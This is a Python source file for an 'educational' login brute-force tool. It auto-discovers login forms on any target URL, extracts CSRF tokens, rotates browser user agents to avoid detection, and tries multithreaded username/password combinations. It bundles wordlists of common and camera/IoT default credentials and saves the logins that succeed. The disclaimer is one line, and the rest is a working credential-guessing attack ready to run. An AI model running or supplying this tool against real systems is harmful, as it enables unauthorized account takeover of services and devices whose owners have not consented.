#!/usr/bin/env python3
"""
Advanced Educational Brute Force Tool
This tool is designed for educational purposes and testing your own applications only.
Use responsibly and only on systems you own or have explicit permission to test.
"""

import requests
import time
import json
import re
import threading
from itertools import product
import argparse
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import random
from concurrent.futures import ThreadPoolExecutor
import os
from datetime import datetime

class AdvancedLoginTester:
    def __init__(self, target_url, delay=1, threads=1, timeout=10):
        self.target_url = target_url
        self.delay = delay
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.successful_logins = []
        self.failed_attempts = 0
        self.total_attempts = 0
        self.lock = threading.Lock()
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
        # Common form field names
        self.username_fields = ['username', 'user', 'email', 'login', 'userid', 'account']
        self.password_fields = ['password', 'pass', 'passwd', 'pwd', 'secret']
        
        # Setup session with headers
        self.setup_session()
        
    def setup_session(self):
        """Setup session with common headers"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
    
    def discover_login_form(self):
        """Automatically discover login form fields"""
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            forms = soup.find_all('form')
            login_form = None
            
            for form in forms:
                # Look for password fields (strong indicator of login form)
                password_inputs = form.find_all('input', {'type': 'password'})
                if password_inputs:
                    login_form = form
                    break
            
            if not login_form:
                print("No login form found with password field")
                return None, None, None
            
            # Extract form action
            action = login_form.get('action', '')
            if action:
                form_url = urljoin(self.target_url, action)
            else:
                form_url = self.target_url
            
            # Find username and password fields
            username_field = None
            password_field = None
            
            # Find password field
            password_input = login_form.find('input', {'type': 'password'})
            if password_input:
                password_field = password_input.get('name')
            
            # Find username field (text input that's not password)
            text_inputs = login_form.find_all('input', {'type': ['text', 'email']})
            for inp in text_inputs:
                name = inp.get('name', '').lower()
                if any(field in name for field in self.username_fields):
                    username_field = inp.get('name')
                    break
            
            # If no specific username field found, use first text input
            if not username_field and text_inputs:
                username_field = text_inputs[0].get('name')
            
            print(f"Discovered form: {form_url}")
            print(f"Username field: {username_field}")
            print(f"Password field: {password_field}")
            
            return form_url, username_field, password_field
            
        except Exception as e:
            print(f"Error discovering login form: {e}")
            return None, None, None
    
    def extract_csrf_token(self, response_text):
        """Extract CSRF token from response"""
        # Common CSRF token patterns
        patterns = [
            r'<input[^>]*name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'<input[^>]*name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'<input[^>]*name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
            r'"csrf_token":\s*"([^"]+)"',
            r'"_token":\s*"([^"]+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    def test_login(self, username, password, form_url=None, username_field='username', password_field='password'):
        """Test a single login attempt"""
        try:
            # Use discovered form URL or default
            url = form_url or self.target_url
            
            # Get fresh session for CSRF token
            response = self.session.get(url, timeout=self.timeout)
            csrf_token = self.extract_csrf_token(response.text)
            
            # Prepare form data
            data = {
                username_field: username,
                password_field: password
            }
            
            # Add CSRF token if found
            if csrf_token:
                # Try common CSRF field names
                csrf_fields = ['_token', 'csrf_token', 'authenticity_token']
                for field in csrf_fields:
                    if field in response.text:
                        data[field] = csrf_token
                        break
            
            # Rotate user agent occasionally
            if random.random() < 0.1:  # 10% chance
                self.session.headers['User-Agent'] = random.choice(self.user_agents)
            
            # Make login request
            login_response = self.session.post(
                url,
                data=data,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            with self.lock:
                self.total_attempts += 1
            
            result = {
                'username': username,
                'password': password,
                'status_code': login_response.status_code,
                'response_length': len(login_response.text),
                'headers': dict(login_response.headers),
                'success': self.check_success(login_response, username),
                'redirect_location': login_response.headers.get('Location', ''),
                'response_time': login_response.elapsed.total_seconds()
            }
            
            if result['success']:
                with self.lock:
                    self.successful_logins.append(result)
            else:
                with self.lock:
                    self.failed_attempts += 1
            
            return result
            
        except requests.RequestException as e:
            with self.lock:
                self.total_attempts += 1
                self.failed_attempts += 1
            
            return {
                'username': username,
                'password': password,
                'error': str(e),
                'success': False
            }
    
    def check_success(self, response, username):
        """Enhanced success detection"""
        status_code = response.status_code
        response_text = response.text.lower()
        headers = response.headers
        
        # Strong success indicators
        strong_success = [
            # Redirects (common for successful logins)
            status_code in [301, 302, 303, 307, 308],
            # Success keywords in response
            any(keyword in response_text for keyword in [
                'dashboard', 'welcome', 'profile', 'logout', 'account',
                'settings', 'admin panel', 'control panel', 'home'
            ]),
            # Success in JSON response
            '"success":true' in response_text or '"status":"success"' in response_text,
            # Set-Cookie header (often indicates session creation)
            'set-cookie' in headers and any(cookie in headers['set-cookie'].lower() 
                                          for cookie in ['session', 'auth', 'token'])
        ]
        
        # Strong failure indicators
        strong_failure = [
            # Error keywords
            any(keyword in response_text for keyword in [
                'invalid', 'incorrect', 'wrong', 'failed', 'error',
                'denied', 'unauthorized', 'forbidden', 'bad credentials',
                'login failed', 'authentication failed'
            ]),
            # JSON error responses
            '"success":false' in response_text or '"error"' in response_text,
            # HTTP error codes
            status_code in [401, 403, 422, 429]
        ]
        
        # Check strong indicators first
        if any(strong_success):
            return True
        if any(strong_failure):
            return False
        
        # Fallback to status code
        return status_code == 200
    
    def run_attack(self, usernames, passwords, form_url=None, username_field='username', password_field='password'):
        """Run the brute force attack"""
        print(f"Starting attack with {len(usernames)} usernames and {len(passwords)} passwords")
        print(f"Total combinations: {len(usernames) * len(passwords)}")
        print(f"Threads: {self.threads}")
        print(f"Delay: {self.delay} seconds")
        print("-" * 60)
        
        # Create all combinations
        combinations = [(u, p) for u in usernames for p in passwords]
        
        if self.threads == 1:
            # Single-threaded execution
            for username, password in combinations:
                result = self.test_login(username, password, form_url, username_field, password_field)
                self.print_result(result)
                time.sleep(self.delay)
        else:
            # Multi-threaded execution
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for username, password in combinations:
                    future = executor.submit(self.test_login, username, password, form_url, username_field, password_field)
                    futures.append(future)
                    time.sleep(self.delay / self.threads)  # Distribute delay across threads
                
                for future in futures:
                    result = future.result()
                    self.print_result(result)
    
    def print_result(self, result):
        """Print formatted result"""
        if 'error' in result:
            print(f"[ERROR] {result['username']}:{result['password']} - {result['error']}")
        elif result['success']:
            print(f"[SUCCESS] {result['username']}:{result['password']} - Status: {result['status_code']}")
            if result.get('redirect_location'):
                print(f"          Redirect: {result['redirect_location']}")
        else:
            print(f"[FAILED] {result['username']}:{result['password']} - Status: {result['status_code']}")

def load_wordlist(filename):
    """Load wordlist from file"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print(f"Wordlist file {filename} not found")
        return []

def create_comprehensive_wordlists():
    """Create comprehensive wordlists for testing"""
    
    # Extended usernames
    usernames = [
        # Common admin accounts
        'admin', 'administrator', 'root', 'sa', 'sysadmin', 'system',
        'operator', 'manager', 'supervisor', 'support', 'service',
        
        # Common user accounts
        'user', 'test', 'guest', 'demo', 'public', 'anonymous',
        'temp', 'trial', 'sample', 'example',
        
        # Email-style usernames
        'admin@localhost', 'test@test.com', 'user@domain.com',
        
        # Numeric accounts
        'admin1', 'user1', 'test1', '123', '1234', '12345',
        
        # Service accounts
        'www', 'web', 'ftp', 'mail', 'email', 'db', 'database',
        'backup', 'monitor', 'nagios', 'zabbix',
        
        # Camera/IoT specific usernames (from provided lists)
        'Admin', 'Administrator', 'Root', 'Supervisor', 'Ubnt',
        'ubnt', 'jvc', 'meinsm', 'service', 'Dinion', 'admin1',
    ]
    
    # Extended passwords
    passwords = [
        # Common weak passwords
        'password', '123456', '12345678', 'qwerty', 'abc123',
        'password123', 'admin', 'letmein', 'welcome', 'monkey',
        'dragon', 'master', 'shadow', 'superman', 'michael',
        
        # Admin passwords
        'admin', 'admin123', 'administrator', 'root', 'toor',
        'pass', 'pass123', 'password1', 'secret', 'secret123',
        
        # Empty and simple
        '', ' ', 'test', 'guest', 'demo', 'public',
        
        # Numeric passwords
        '123', '1234', '12345', '123456', '1234567', '12345678',
        '000000', '111111', '123123', '321321',
        
        # Keyboard patterns
        'qwerty', 'asdf', 'zxcv', 'qwertyuiop', 'asdfghjkl',
        '1qaz2wsx', 'qazwsx', 'zaq12wsx',
        
        # Years and dates
        '2023', '2024', '2025', '2022', '2021', '2020',
        
        # Camera/IoT specific passwords (from provided lists)
        '9999', 'camera', 'flir', 'fliradmin', '12345', '4321', '1111111',
        'system', 'ikwd', 'ikwb', 'wbox123', '999', 'abcd', 'ABCD', 
        '12345678', 'admin123', 'admin1', '888888', '666666', 'jvc',
        'meinsm', '1111', 'pass',
        
        # Same as username (will be handled dynamically)
        '<USERNAME>', '<username>', '<USERNAME>123'
    ]
    
    with open('bruteforce/usernames.txt', 'w') as f:
        f.write('\n'.join(usernames))
        
    with open('bruteforce/passwords.txt', 'w') as f:
        f.write('\n'.join(passwords))
    
    print("Created comprehensive wordlists:")
    print(f"  usernames.txt - {len(usernames)} entries")
    print(f"  passwords.txt - {len(passwords)} entries")
    
    return usernames, passwords

def process_passwords(passwords, username):
    """Process passwords, replacing placeholders with actual username"""
    processed = []
    for pwd in passwords:
        if '<USERNAME>' in pwd:
            processed.append(pwd.replace('<USERNAME>', username))
        elif '<username>' in pwd:
            processed.append(pwd.replace('<username>', username.lower()))
        else:
            processed.append(pwd)
    return processed

def save_results(tester, output_file):
    """Save results to file"""
    results = {
        'timestamp': datetime.now().isoformat(),
        'total_attempts': tester.total_attempts,
        'failed_attempts': tester.failed_attempts,
        'successful_logins': tester.successful_logins,
        'success_rate': (len(tester.successful_logins) / tester.total_attempts * 100) if tester.total_attempts > 0 else 0
    }
    
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"Results saved to {output_file}")

def main():
    parser = argparse.ArgumentParser(description='Advanced Educational Login Brute Force Tester')
    parser.add_argument('url', help='Target login URL')
    parser.add_argument('-u', '--usernames', help='Username wordlist file')
    parser.add_argument('-p', '--passwords', help='Password wordlist file')
    parser.add_argument('-d', '--delay', type=float, default=1.0, 
                       help='Delay between requests (seconds)')
    parser.add_argument('-t', '--threads', type=int, default=1,
                       help='Number of threads (use with caution)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds')
    parser.add_argument('--auto-discover', action='store_true',
                       help='Automatically discover login form fields')
    parser.add_argument('--username-field', default='username',
                       help='Username field name (if not auto-discovering)')
    parser.add_argument('--password-field', default='password',
                       help='Password field name (if not auto-discovering)')
    parser.add_argument('--create-wordlists', action='store_true',
                       help='Create comprehensive wordlists')
    parser.add_argument('-o', '--output', help='Output file for results (JSON)')
    
    args = parser.parse_args()
    
    if args.create_wordlists:
        create_comprehensive_wordlists()
        return
    
    # Load wordlists
    if args.usernames:
        usernames = load_wordlist(args.usernames)
    else:
        usernames = ['admin', 'user', 'test', 'guest']
        
    if args.passwords:
        passwords = load_wordlist(args.passwords)
    else:
        passwords = ['password', '123456', 'admin', 'test']
    
    if not usernames or not passwords:
        print("No valid wordlists found. Use --create-wordlists to generate defaults.")
        return
    
    # Initialize tester
    tester = AdvancedLoginTester(
        args.url, 
        delay=args.delay, 
        threads=args.threads,
        timeout=args.timeout
    )
    
    # Auto-discover form fields if requested
    form_url = args.url
    username_field = args.username_field
    password_field = args.password_field
    
    if args.auto_discover:
        discovered_url, discovered_user_field, discovered_pass_field = tester.discover_login_form()
        if discovered_url:
            form_url = discovered_url
            username_field = discovered_user_field or username_field
            password_field = discovered_pass_field or password_field
    
    print(f"Target: {form_url}")
    print(f"Username field: {username_field}")
    print(f"Password field: {password_field}")
    print(f"Usernames: {len(usernames)}")
    print(f"Passwords: {len(passwords)}")
    
    try:
        # Run the attack
        tester.run_attack(usernames, passwords, form_url, username_field, password_field)
        
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
    
    # Print summary
    print("\n" + "="*60)
    print("ATTACK SUMMARY")
    print("="*60)
    print(f"Total attempts: {tester.total_attempts}")
    print(f"Failed attempts: {tester.failed_attempts}")
    print(f"Successful logins: {len(tester.successful_logins)}")
    
    if tester.successful_logins:
        print("\nSuccessful credentials:")
        for login in tester.successful_logins:
            print(f"  {login['username']}:{login['password']} (Status: {login['status_code']})")
            if login.get('redirect_location'):
                print(f"    Redirect: {login['redirect_location']}")
    
    # Save results if requested
    if args.output:
        save_results(tester, args.output)

if __name__ == "__main__":
    main()